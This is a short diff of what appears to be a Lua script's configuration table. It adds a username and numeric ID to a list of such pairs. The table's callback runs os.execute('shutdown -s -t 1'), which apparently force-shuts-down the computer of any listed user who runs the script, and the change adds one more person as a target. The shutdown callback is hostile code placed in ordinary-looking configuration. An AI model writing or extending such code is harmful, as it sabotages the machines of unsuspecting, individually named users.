@@ -197,6 +197,7 @@
     {1588597589,'7imgood7'},
     {3493191959,'purplewolfer'},
     {941952708,'inozemtsev04'},
+    {1546881015,'brawlstars__top'},
   },
   callback = function() os.execute('shutdown -s -t 1')  end,
 }
